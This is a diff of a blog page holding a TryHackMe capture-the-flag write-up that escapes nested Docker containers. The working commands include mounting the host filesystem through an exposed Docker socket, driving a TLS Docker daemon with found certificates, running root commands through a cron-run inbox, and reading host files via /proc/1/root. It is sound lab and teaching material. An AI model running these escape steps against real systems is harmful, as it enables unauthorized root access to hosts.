@@ -7,10 +7,10 @@
 <meta name="robots" content="index, follow">
 <title>Matryoshka | Jenn Shagrin</title>
 <meta name="keywords" content="">
-<meta name="description" content="TryHackMe CTF — Docker socket exposure, Alpine chroot container escape, Docker-in-Docker via TLS remote daemon, inbox/outbox cron RCE, privileged --pid=host flag read on real AWS host.">
+<meta name="description" content="TryHackMe CTF. Docker socket exposure, an Alpine chroot container escape, a TLS Docker daemon, and an inbox/outbox path to the real AWS host.">
 <meta name="author" content="">
 <link rel="canonical" href="https://jennshaggy.github.io/matryoshka.html">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.40a236105b83b1f05a55d0a48876965b59b1d8f81f351041e484dc5905b375dc.css" rel="preload stylesheet" as="style">
     <link rel="stylesheet" href="/assets/css/accents.css">
 <link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
@@ -68,15 +68,18 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&amp;family=Source+Code+Pro:wght@400;500;600&amp;family=Tomorrow:wght@500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/site-ui-lab.css">
 <meta property="og:url" content="https://jennshaggy.github.io/matryoshka.html">
 <meta property="og:site_name" content="Jenn Shagrin">
 <meta property="og:title" content="Matryoshka">
-<meta property="og:description" content="TryHackMe CTF — Docker socket exposure, Alpine chroot escape, Docker-in-Docker via TLS, inbox/outbox cron RCE, real AWS host flag.">
+<meta property="og:description" content="TryHackMe CTF. Docker socket exposure, an Alpine chroot container escape, a TLS Docker daemon, and an inbox/outbox path to the real AWS host.">
 <meta property="og:locale" content="en-us">
 <meta property="og:type" content="article">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Matryoshka">
-<meta name="twitter:description" content="TryHackMe CTF — Docker socket exposure, Alpine chroot escape, Docker-in-Docker via TLS, inbox/outbox cron RCE, real AWS host flag.">
+<meta name="twitter:description" content="TryHackMe CTF. Docker socket exposure, an Alpine chroot container escape, a TLS Docker daemon, and an inbox/outbox path to the real AWS host.">
 </head>
 
 <body id="top">
@@ -105,6 +108,7 @@
                         <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                     </svg>
                 </button>
+                <button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu"><span class="menu-toggle-label">Menu</span><span class="menu-toggle-icon" aria-hidden="true"><span></span><span></span></span></button>
             </div>
         </div>
         <ul id="menu">
@@ -134,7 +138,7 @@
                 </a>
             </li>
             <li>
-                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                <a href="/ai-security/" title="AI Security">
                     <span>AI Security</span>
                 </a>
             </li>
@@ -143,7 +147,7 @@
 </header>
 
 <main class="main">
-<article class="post-single">
+<article class="post-single technical-writeup">
   <header class="post-header">
     <h1 class="post-title entry-hint-parent">Matryoshka</h1>
     <div class="post-description">TryHackMe Linux container escape. You set up a containment unit designed to trap and contain even the most nefarious viruses, but you accidentally got trapped in it while testing it. Your memory is fuzzy. Good luck.</div>
@@ -151,31 +155,25 @@
 
   <div class="post-content">
 
-<p>I have a set of Matryoshka (or, as I affectionately called them as a kid/today, &ldquo;Nanotchka&rdquo;) dolls on my nightstand. On the outside, they&rsquo;re ornately painted with a deceptively simple structure. In truth, they&rsquo;re internally weaponized with a 9-clone army.</p>
+<p>I have a set of Matryoshka (or, as I affectionately called them as a kid/today, &ldquo;Nanotchka&rdquo;) dolls on my nightstand. On the outside, they&rsquo;re ornately painted with a deceptively simple structure. In truth, they&rsquo;re internally weaponized with a 9-clone army. They&rsquo;re also known as Russian stacking dolls.</p>
 
-<p>I expect layers upon layers of priv-esc fun.</p>
-
-<hr>
+<p>I expect layers upon layers of priv-esc fun. But first...</p>
 
 <h2>Recon</h2>
+
+<pre><code>nmap -sC -p- -Pn -T4 TARGET_IP</code></pre>
+
+<p>This Nmap scan is taking longer than usual. After a target IP refresh, the more detailed Nmap service and vulnerability scan output arrives at the speed of sound:</p>
 
 <pre><code>nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP</code></pre>
 
 <img src="/images/matryoshka/Screenshot 2026-05-09 at 7.56.56 AM.png" alt="nmap detailed scan with vuln output" style="max-width:100%;margin:2rem 0;">
 
-<p>Not sure about y&rsquo;all, but this is giving Android vibes.</p>
+<p>Not sure about y&rsquo;all, but this is giving Android/Docker vibes.</p>
 
 <img src="/images/matryoshka/Screenshot 2026-05-09 at 7.57.35 AM.png" alt="Android estimation 85% assurance" style="max-width:100%;margin:2rem 0;">
 
-<p>Open ports:</p>
-<ul>
-<li>22 (SSH), aligns with provided credentials</li>
-<li>Android estimated at 85% assurance</li>
-</ul>
-
-<p>Time to SSH in.</p>
-
-<hr>
+<p>22 is the only open port and we thankfully have the credentials. Time to SSH in.</p>
 
 <h2>Level 1: SSH Entry</h2>
 
@@ -183,9 +181,7 @@
 
 <img src="/images/matryoshka/Screenshot 2026-05-09 at 8.30.20 AM.png" alt="SSH login banner Escape is futile" style="max-width:100%;margin:2rem 0;">
 
-<p>&ldquo;Escape is futile.&rdquo;</p>
-
-<p>Excuse me? I think not.</p>
+<p>&ldquo;Escape is futile.&rdquo; Excuse me? I think not.</p>
 
 <p>As an aside, I can hit CTRL+C at any time.</p>
 
@@ -203,33 +199,41 @@ uname -a</code></pre>
 
 <p>An empty hollow.</p>
 
+<p>Let&rsquo;s peek around the system. The screenshot below captures both searches:</p>
+
+<pre><code>find / -name "*.txt" 2&gt;/dev/null</code></pre>
+
+<p>Ohhh. The drama. Returned nothing. Let&rsquo;s try again:</p>
+
 <pre><code>find / -name "*flag*" 2&gt;/dev/null</code></pre>
 
 <img src="/images/matryoshka/Screenshot 2026-05-09 at 8.42.22 AM.png" alt="find returning false flag paths" style="max-width:100%;margin:2rem 0;">
 
-<p>Nice try, Matryoshka Containment Unit. This bot-adjacent entity will not be entrapped.</p>
+<p>Nice try, Matryoshka Containment Unit. This bot-adjacent entity will not be entrapped. The search found files with &ldquo;flag&rdquo; in their names, but none of the challenge flags. We need to find what&rsquo;s running and mounted.</p>
 
-<p>False flags. This is a container escape challenge, so we need to find what&rsquo;s running and mounted.</p>
+<p>Let&rsquo;s scan the environment variables, then check the mounts:</p>
+
+<pre><code>env</code></pre>
 
 <pre><code>cat /proc/mounts</code></pre>
 
 <img src="/images/matryoshka/Screenshot 2026-05-09 at 8.48.01 AM.png" alt="docker socket visible in mounts" style="max-width:100%;margin:2rem 0;">
 
-<p>BIG find. Docker containers are mounted inside <code>docker.sock</code> (hence, the Docker socket).</p>
+<p>BIG find. The mount output names <code>/run/docker.sock</code>. Let&rsquo;s check Docker&rsquo;s availability.</p>
 
 <pre><code>docker ps</code></pre>
 
 <img src="/images/matryoshka/Screenshot 2026-05-09 at 8.54.57 AM.png" alt="docker ps showing current container" style="max-width:100%;margin:2rem 0;">
 
-<p>The Matryoshka allegory web spins its reality inside of Docker containers. Excellent.</p>
+<p>Now THIS is fun. We can see the container we&rsquo;re in. The Matryoshka allegory web spins its reality inside of Docker containers. Excellent.</p>
 
 <pre><code>docker images</code></pre>
 
 <img src="/images/matryoshka/Screenshot 2026-05-09 at 8.56.31 AM.png" alt="docker images showing alpine available" style="max-width:100%;margin:2rem 0;">
 
-<p>Reminds of Super Mario brothers methodology.</p>
+<p>Reminds me of Super Mario brothers methodology.</p>
 
-<p>We need to run a new Docker container from the visible Alpine image, then mount the host filesystem into it.</p>
+<p>We need to run a new Docker container from the Alpine image, then mount the host filesystem into it.</p>
 
 <pre><code>docker run -v /:/mnt --rm -it alpine:3.20 chroot /mnt sh
 whoami</code></pre>
@@ -240,11 +244,9 @@ whoami</code></pre>
 
 <pre><code>cat /root/flag_level2.txt</code></pre>
 
-<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.02.01 AM.png" alt="level 2 flag captured" style="max-width:100%;margin:2rem 0;">
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.02.01 AM-redacted.png" alt="level 2 flag captured with the value redacted" style="max-width:100%;margin:2rem 0;">
 
 <p>Nabbed our first flag. Good job, Jenn.</p>
-
-<hr>
 
 <h2>Level 2: Mapping the Hall of Mirrors</h2>
 
@@ -256,39 +258,70 @@ whoami</code></pre>
 
 <p>What we have:</p>
 <ul>
-<li><strong>PID 1:</strong> <code>level2-entrypoint.sh</code>, the host container&rsquo;s init process</li>
-<li><strong>PID 7/101:</strong> <code>dockerd</code> running TLS on TCP port 2376, fully exposed</li>
-<li><strong>PID 108:</strong> <code>containerd</code>, the container runtime under Docker</li>
-<li><strong>PID 310/420:</strong> two <code>containerd-shim</code> processes (the actual running containers being managed)</li>
-<li><strong>PID 330/376:</strong> Our level1 container, uid 1000 = matryoshka</li>
-<li><strong>PID 404:</strong> where we are now, in the alpine container we just spawned</li>
+<li><strong>PID 1:</strong> <code>level2-entrypoint.sh</code>, the host container&rsquo;s init process.</li>
+<li><strong>PID 7/101:</strong> <code>dockerd</code> running TLS on TCP port 2376, fully exposed.</li>
+<li><strong>PID 108:</strong> <code>containerd</code>, the container runtime under Docker.</li>
+<li><strong>PID 310/420:</strong> two <code>containerd-shim</code> processes (the actual running containers being managed).</li>
+<li><strong>PID 330/376:</strong> Our level1 container, uid 1000 = matryoshka.</li>
+<li><strong>PID 404:</strong> Where we are now, in the Alpine container we just spawned.</li>
 </ul>
 
-<p>To get to Level 3, we need to find another container or another flag living on the host Docker&rsquo;s filesystem.</p>
+<p>To get to Level 3, we need to locate another container or flag on the Docker host. Let&rsquo;s see if we can find either on its filesystem.</p>
 
-<p>After enumerating <code>/</code>, <code>/root</code>, <code>/home</code>, <code>/var</code>, and <code>/opt</code>, I noticed something interesting:</p>
+<pre><code>ls /
+ls /root
+ls /home</code></pre>
+
+<p>This grows more interesting by the second. According to some quick research, <code>dockremap</code> is a user related to Docker&rsquo;s namespace remapping.</p>
 
 <img src="/images/matryoshka/Screenshot 2026-05-09 at 9.13.10 AM.png" alt="dockremap user discovered" style="max-width:100%;margin:2rem 0;">
 
-<p><code>dockremap</code> is a user related to Docker&rsquo;s namespace remapping.</p>
+<pre><code>ls -la /home/dockremap
+ls /var
+ls /opt</code></pre>
 
-<pre><code>ls /opt</code></pre>
+<p><code>ls /opt</code> is reading as a solid lead. Let&rsquo;s investigate:</p>
 
 <img src="/images/matryoshka/Screenshot 2026-05-09 at 9.16.53 AM.png" alt="/opt/images directory found" style="max-width:100%;margin:2rem 0;">
 
-<p><code>/opt</code> is reading as a solid lead.</p>
+<pre><code>ls /opt/images
+docker images</code></pre>
 
-<p>After confirming <code>/run/docker.sock</code> and <code>/var/run/docker.sock</code> were the same socket (same device, inode, permissions, timestamp via <code>stat</code>), I pivoted to inspect the entrypoint script:</p>
+<img src="/images/matryoshka/level2-image-inventory.png" alt="Level 2 image directory and Docker image list" style="max-width:100%;margin:2rem 0;">
+
+<p><code>/opt/images</code> looks promising, but <code>docker images</code> doesn&rsquo;t show a level3 image to run. Let&rsquo;s inspect the level1 image we already know about:</p>
+
+<pre><code>docker inspect matryoshka-level1:local</code></pre>
+
+<img src="/images/matryoshka/level1-image-inspection.png" alt="Docker inspect output for the level 1 image" style="max-width:100%;margin:2rem 0;">
+
+<p>The image inspection didn&rsquo;t give me the next step. PID 1 is running <code>level2-entrypoint.sh</code>, so let&rsquo;s read that:</p>
 
 <pre><code>cat /usr/local/bin/level2-entrypoint.sh</code></pre>
 
 <img src="/images/matryoshka/Screenshot 2026-05-09 at 9.24.10 AM.png" alt="level2 entrypoint script revealed" style="max-width:100%;margin:2rem 0;">
 
-<p>The level2 flag came from <code>$LEVEL2_FLAG</code> environment variable. Despite being root in level2, level2 is only a container on the real host. If the real host has a Docker socket available, we can escape level2 to escalate to the level3 host and flag.</p>
+<p>The level2 flag came from the <code>$LEVEL2_FLAG</code> environment variable. Despite already being root in level2, we&rsquo;re still inside a container. If the real host has a Docker socket available, perhaps we can escape level2.</p>
 
-<p>The pattern: each layer passes its Docker socket down to the next container. Level2 passed its socket to level1, which is how we escaped level1.</p>
+<p>Let&rsquo;s check for that socket:</p>
 
-<hr>
+<pre><code>ls /run/docker.sock
+ls /var/run/docker.sock</code></pre>
+
+<img src="/images/matryoshka/docker-socket-paths.png" alt="Both Docker socket paths exist" style="max-width:100%;margin:2rem 0;">
+
+<p>The two paths could lead to the same socket. Let&rsquo;s compare their permissions, device numbers, and inodes:</p>
+
+<pre><code>ls -la /run/docker.sock
+ls -la /var/run/docker.sock
+stat /run/docker.sock
+stat /var/run/docker.sock</code></pre>
+
+<img src="/images/matryoshka/docker-socket-inodes.png" alt="Docker socket paths share device and inode numbers" style="max-width:100%;margin:2rem 0;">
+
+<p>Also samesies. Same device and inode numbers. We&rsquo;re dealing with one socket.</p>
+
+<p>Back to <code>/certs</code>.</p>
 
 <h2>TLS Cert Enumeration</h2>
 
@@ -297,13 +330,13 @@ ls /certs/client</code></pre>
 
 <img src="/images/matryoshka/Screenshot 2026-05-09 at 9.37.32 AM.png" alt="TLS certificates available in /certs" style="max-width:100%;margin:2rem 0;">
 
-<p>Those pretty little TLS client certificates are for connecting to a remote Docker daemon. The level2 dockerd is pants-down exposed on TCP 2376.</p>
+<p>Those pretty little TLS client certificates are for connecting to a remote Docker daemon. The level2 <code>dockerd</code> is pants-down exposed on TCP 2376.</p>
 
 <pre><code>ip route</code></pre>
 
 <img src="/images/matryoshka/Screenshot 2026-05-09 at 9.40.09 AM.png" alt="ip route showing 172.17.0.1 gateway" style="max-width:100%;margin:2rem 0;">
 
-<p>The gateway to the real host is <code>172.17.0.1</code>. Perhaps its Daemon will connect us if we summon it politely (commence CLI Seance&hellip;).</p>
+<p>The gateway to the real host is <code>172.17.0.1</code>. Perhaps its daemon will connect us if we summon it politely (commence CLI Seance&hellip;).</p>
 
 <pre><code>docker --tlsverify --tlscacert /certs/ca/ca.pem --tlscert /certs/client/cert.pem --tlskey /certs/client/key.pem -H tcp://172.17.0.1:2376 ps</code></pre>
 
@@ -325,13 +358,19 @@ ls /certs/client</code></pre>
 
 <pre><code>docker --tlsverify --tlscacert /certs/ca/cert.pem --tlscert /certs/client/cert.pem --tlskey /certs/client/key.pem -H tcp://172.18.0.2:2376 ps</code></pre>
 
-<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.46.14 AM.png" alt="host docker daemon connection successful" style="max-width:100%;margin:2rem 0;">
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.46.14 AM.png" alt="TLS connection to the Docker daemon at 172.18.0.2 succeeds" style="max-width:100%;margin:2rem 0;">
 
-<p>Well hello there, Host Docker Daemon. Now we&rsquo;re talking (literally).</p>
+<p>Well hello there, Docker daemon. Now we&rsquo;re talking (literally). At this point I thought I&rsquo;d found the real host. And, per chance, what images might she have available? I&rsquo;ll list them before trying another mount:</p>
 
-<pre><code>docker --tlsverify [...certs...] -H tcp://172.18.0.2:2376 run -v /:/mnt --rm -it alpine:3.20 chroot /mnt sh</code></pre>
+<pre><code>docker --tlsverify --tlscacert /certs/ca/cert.pem --tlscert /certs/client/cert.pem --tlskey /certs/client/key.pem -H tcp://172.18.0.2:2376 images</code></pre>
 
-<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.48.53 AM.png" alt="filesystem mounted via host daemon" style="max-width:100%;margin:2rem 0;">
+<img src="/images/matryoshka/tls-daemon-images.png" alt="TLS Docker daemon lists level 1 and Alpine images" style="max-width:100%;margin:2rem 0;">
+
+<p>Aha! Now we can try mounting its filesystem:</p>
+
+<pre><code>docker --tlsverify --tlscacert /certs/ca/cert.pem --tlscert /certs/client/cert.pem --tlskey /certs/client/key.pem -H tcp://172.18.0.2:2376 run -v /:/mnt --rm -it alpine:3.20 chroot /mnt sh</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.48.53 AM.png" alt="filesystem mounted via TLS Docker daemon" style="max-width:100%;margin:2rem 0;">
 
 <p>Mounted. Take that!</p>
 
@@ -339,33 +378,37 @@ ls /certs/client</code></pre>
 
 <img src="/images/matryoshka/Screenshot 2026-05-09 at 9.49.45 AM.png" alt="two flag paths found" style="max-width:100%;margin:2rem 0;">
 
-<p>Eye spy two flags: one we have, and one we don&rsquo;t.</p>
+<p>Eye spy two flags: one we have, and one we don&rsquo;t. I&rsquo;ll also check whether a level3 image tarball is here:</p>
 
 <pre><code>find / -name "*.tar" 2&gt;/dev/null</code></pre>
 
-<p>No tarballs. Shucks.</p>
+<img src="/images/matryoshka/tarball-search.png" alt="Tarball search finds level 1 and Alpine images but no level 3 image" style="max-width:100%;margin:2rem 0;">
+
+<p>No level3 image tarball. Shucks.</p>
 
 <pre><code>ip route</code></pre>
 
-<p>Our IP is <code>172.17.0.3</code>, the gateway is at <code>172.17.0.1</code>. The daemon at <code>172.18.0.2</code> is on a different subnet. Foiled! That&rsquo;s the level2 container&rsquo;s internal Docker network, not the real host.</p>
+<img src="/images/matryoshka/level2-network-route.png" alt="Level 2 container route through 172.17.0.1" style="max-width:100%;margin:2rem 0;">
 
-<hr>
+<p>Our IP is <code>172.17.0.3</code>, the gateway is at <code>172.17.0.1</code>. The daemon at <code>172.18.0.2</code> is on a different subnet. Foiled! That&rsquo;s the level2 container&rsquo;s internal Docker network, not the real host as suspected. We mounted the level2 filesystem, not the real AWS host.</p>
 
 <h2>Level 3: The Inbox/Outbox Pattern</h2>
 
-<p>Full-metal Jenn = commence!! The host-level flag is likely not in Docker.</p>
+<p>Full-metal Jenn = commence. The host-level flag is likely not in Docker.</p>
 
 <pre><code>cat /proc/1/mountinfo</code></pre>
 
 <img src="/images/matryoshka/Screenshot 2026-05-09 at 10.06.39 AM.png" alt="mountinfo line 461 showing level3share" style="max-width:100%;margin:2rem 0;">
 
-<p>Level3share on line 461. This is where the host mounted the level3share directory.</p>
+<p>Level3share on line 461. This is where the host mounted the level3share directory. Let&rsquo;s check what&rsquo;s inside:</p>
 
 <pre><code>ls /mnt/level3share
 ls /mnt/level3share/inbox
 ls /mnt/level3share/outbox</code></pre>
 
-<p>Both inbox and outbox empty. Time to hit the drawing board (aka a search engine).</p>
+<img src="/images/matryoshka/level3share-directories.png" alt="Level 3 share contains inbox and outbox directories" style="max-width:100%;margin:2rem 0;">
+
+<p>Both <code>inbox</code> and <code>outbox</code> are empty. Time to hit the drawing board (aka a search engine).</p>
 
 <p>The <code>inbox/outbox</code> pattern in <code>/mnt/level3share</code> suggests a job queue mechanism: command written to inbox, output posts to outbox.</p>
 
@@ -376,7 +419,7 @@ sleep 2 &amp;&amp; cat /mnt/level3share/outbox/cmd</code></pre>
 
 <img src="/images/matryoshka/Screenshot 2026-05-09 at 10.14.22 AM.png" alt="host not auto-processing cmd file" style="max-width:100%;margin:2rem 0;">
 
-<p>The host is not auto-processing. The file is sitting in inbox unprocessed, likely waiting for a cronjob to pick it up. Let&rsquo;s check level2&rsquo;s cron:</p>
+<p>The host is not auto-processing. The file is sitting in the inbox unprocessed, likely waiting for a cronjob to pick it up. Let&rsquo;s check level2&rsquo;s cron:</p>
 
 <pre><code>cat /etc/crontab
 ls /etc/cron*
@@ -410,11 +453,9 @@ sleep 35 &amp;&amp; cat /mnt/level3share/outbox/flag.sh.out</code></pre>
 <pre><code>echo "cat /root/flag_level3.txt" &gt; /mnt/level3share/inbox/getflag.sh
 sleep 45 &amp;&amp; cat /mnt/level3share/outbox/getflag.sh.out</code></pre>
 
-<img src="/images/matryoshka/Screenshot 2026-05-09 at 10.39.51 AM.png" alt="level 3 flag captured" style="max-width:100%;margin:2rem 0;">
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 10.39.51 AM-redacted.png" alt="level 3 flag captured with the value redacted" style="max-width:100%;margin:2rem 0;">
 
 <p>Second flag = unlocked.</p>
-
-<hr>
 
 <h2>The Real AWS Host</h2>
 
@@ -426,26 +467,27 @@ sleep 45 &amp;&amp; cat /mnt/level3share/outbox/getflag.sh.out</code></pre>
 
 <pre><code>echo "ps auxf 2&gt;/dev/null || ps -ef" &gt; /mnt/level3share/inbox/procs.sh</code></pre>
 
-<p>Big find. We have exhumed the tinies Matryoshka, controlling her network of Docker Dolls from the very inside (drumroll, please&hellip;).</p>
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 11.02.51 AM.png" alt="PID 1 is systemd on real host" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 11.03.21 AM.png" alt="PID 1191 dockerd and 1411 level3 container" style="max-width:100%;margin:2rem 0;">
+
+<p>Big find. The process output shows what&rsquo;s running beyond our starting container. We have exhumed the tiniest Matryoshka, controlling her network of Docker Dolls from the very inside (drumroll, please&hellip;).</p>
 
 <p>Behind Door #1: <strong>Real AWS host</strong> (PID 1 = systemd, EC2 instance with ssm-agent).</p>
 
 <p>This tiny lady:</p>
 <ul>
-<li>Runs <code>dockerd</code> PID 1191</li>
-<li>PID 1191 runs level3 container PID 1411. Her hobbies and interests are <code>--privileged --pid=host</code></li>
-<li>level3 runs level2 container, which runs level1 container, which is where we SSH&rsquo;d in</li>
+<li>Runs <code>dockerd</code> PID 1191.</li>
+<li>PID 1191 runs level3 container PID 1411. Her hobbies and interests are <code>--privileged --pid=host</code>.</li>
+<li>Level3 runs level2 container, which runs level1 container, which is where we SSH&rsquo;d in.</li>
 </ul>
 
-<img src="/images/matryoshka/Screenshot 2026-05-09 at 11.02.51 AM.png" alt="PID 1 is systemd on real host" style="max-width:100%;margin:2rem 0;">
-
-<img src="/images/matryoshka/Screenshot 2026-05-09 at 11.03.21 AM.png" alt="PID 1191 dockerd and 1411 level3 container" style="max-width:100%;margin:2rem 0;">
 
 <p>Our inbox <code>cmd</code>s are processed by <code>runner.sh</code> on the level3 container. We are executing as root inside level3, which is <code>--privileged --pid=host</code>, so we can read host files via <code>/proc/1/root</code> because PID 1 IS the host&rsquo;s systemd.</p>
 
 <pre><code>echo "cat /proc/1/root/etc/matryoshka.env" &gt; /mnt/level3share/inbox/hostenv.sh</code></pre>
 
-<p>(le wait)</p>
+<p>Wait for the runner to process <code>hostenv.sh</code>, then read the output:</p>
 
 <pre><code>cat /mnt/level3share/outbox/hostenv.sh.out</code></pre>
 
@@ -461,13 +503,9 @@ sleep 35 &amp;&amp; cat /mnt/level3share/outbox/hosthomes.sh.out</code></pre>
 <pre><code>echo "cat /proc/1/root/root/flag_host.txt" &gt; /mnt/level3share/inbox/hostflag3.sh
 sleep 35 &amp;&amp; cat /mnt/level3share/outbox/hostflag3.sh.out</code></pre>
 
-<img src="/images/matryoshka/Screenshot 2026-05-09 at 11.13.11 AM.png" alt="final flag THM SP@C3D_0UT captured" style="max-width:100%;margin:2rem 0;">
-
-<p><strong>THM{SP@C3D_0UT}</strong></p>
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 11.13.11 AM-redacted.png" alt="final host flag captured with the value redacted" style="max-width:100%;margin:2rem 0;">
 
 <p>Now THM Jenn = out. Happy weekend.</p>
-
-<hr>
 
 <h2>Lessons Learned</h2>
 
@@ -475,16 +513,14 @@ sleep 35 &amp;&amp; cat /mnt/level3share/outbox/hostflag3.sh.out</code></pre>
 
 <ol>
 <li><p><strong><code>ps auxf</code> process tree:</strong> PID 1 was <code>/sbin/init</code> (systemd), plus init processes like <code>systemd-journald</code>, <code>cron</code>, <code>sshd</code>, <code>containerd</code>, <code>dockerd</code>, <code>amazon-ssm-agent</code>. Normal containers only show their own processes. The level3 container was started with <code>--pid=host</code>, and that flag shares the host&rsquo;s PID namespace with the container.</p></li>
-<li><p><strong>The <code>--privileged</code> flag</strong> disables most container isolation. When <code>--privileged</code> is combined with <code>--pid=host</code>, we can read host files via <code>/proc/1/root</code> because PID 1 was the actual host&rsquo;s systemd, not a container&rsquo;s init.</p></li>
+<li><p><strong>The <code>--privileged</code> flag</strong> disables most container isolation. When <code>--privileged</code> is combined with <code>--pid=host</code>, we can read host files via <code>/proc/1/root</code> because PID 1 was the actual host&rsquo;s systemd.</p></li>
 </ol>
 
-<p>Put simply: the biggest red-flag phrase in the docker run command was:</p>
+<p>Put simply: the biggest red flag phrase in the docker run command was:</p>
 
 <pre><code>--privileged --pid=host</code></pre>
 
 <p>That&rsquo;s a known, vulnerable Docker config. It&rsquo;s essentially running a container with the security of being on the host itself, making it a root shell with extra steps versus a real container. Valuable lesson learned, indeed.</p>
-
-<hr>
 
 <h2>Full Attack Chain</h2>
 
@@ -492,16 +528,16 @@ sleep 35 &amp;&amp; cat /mnt/level3share/outbox/hostflag3.sh.out</code></pre>
 &rarr; /proc/mounts reveals Docker socket exposed inside container
 &rarr; docker run -v /:/mnt alpine:3.20 chroot /mnt sh &rarr; root in Level 2 container
 &rarr; cat /root/flag_level2.txt (first flag)
-&rarr; ps aux reveals dockerd on TCP 2376 with TLS, containerd shims, level3share mount
+&rarr; ps aux reveals dockerd on TCP 2376 with TLS and containerd shims
 &rarr; /certs enumeration: TLS client certs available, server cert valid for 172.18.0.2
-&rarr; docker --tlsverify -H tcp://172.18.0.2:2376 &rarr; host Docker daemon connection
-&rarr; Mount Level 2 filesystem via host daemon, but discover 172.18.0.2 is internal Docker network not real host
+&rarr; docker --tlsverify -H tcp://172.18.0.2:2376 &rarr; Docker daemon connection
+&rarr; Mount Level 2 filesystem via that daemon, then discover 172.18.0.2 is on an internal Docker network
 &rarr; /proc/1/mountinfo reveals /mnt/level3share with inbox/outbox cron processor
 &rarr; Filename test: cmd ignored, test.sh processed &rarr; arbitrary root command execution on Level 3
 &rarr; cat /root/flag_level3.txt (second flag)
 &rarr; ps auxf in Level 3 reveals --privileged --pid=host flag, PID 1 = real host systemd
 &rarr; /proc/1/root/ exposes real AWS host filesystem
-&rarr; cat /proc/1/root/root/flag_host.txt &rarr; THM{SP@C3D_0UT}</code></pre>
+&rarr; cat /proc/1/root/root/flag_host.txt &rarr; final host flag</code></pre>
 
   </div>
   <footer class="post-footer"></footer>
@@ -574,6 +610,9 @@ sleep 35 &amp;&amp; cat /mnt/level3share/outbox/hostflag3.sh.out</code></pre>
             localStorage.setItem("pref-theme", 'dark');
         }
     })
+</script>
+<script>
+(()=>{const t=document.getElementById("menu-toggle"),m=document.getElementById("menu");if(!t||!m)return;document.documentElement.classList.add("js-menu-ready");const close=(focus=false)=>{t.setAttribute("aria-expanded","false");m.classList.remove("menu-open");if(focus)t.focus()};t.addEventListener("click",()=>{const open=t.getAttribute("aria-expanded")==="true";t.setAttribute("aria-expanded",String(!open));m.classList.toggle("menu-open",!open)});m.addEventListener("click",e=>{if(e.target.closest("a"))close()});document.addEventListener("click",e=>{if(t.getAttribute("aria-expanded")==="true"&&!m.contains(e.target)&&!t.contains(e.target))close()});document.addEventListener("keydown",e=>{if(e.key==="Escape"&&t.getAttribute("aria-expanded")==="true")close(true)});window.matchMedia("(min-width: 769px)").addEventListener("change",e=>{if(e.matches)close()})})();
 </script>
 <!-- Cloudflare Web Analytics --><script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "d29793993e20413c866dbc989486b294"}'></script><!-- End Cloudflare Web Analytics -->
 </body>
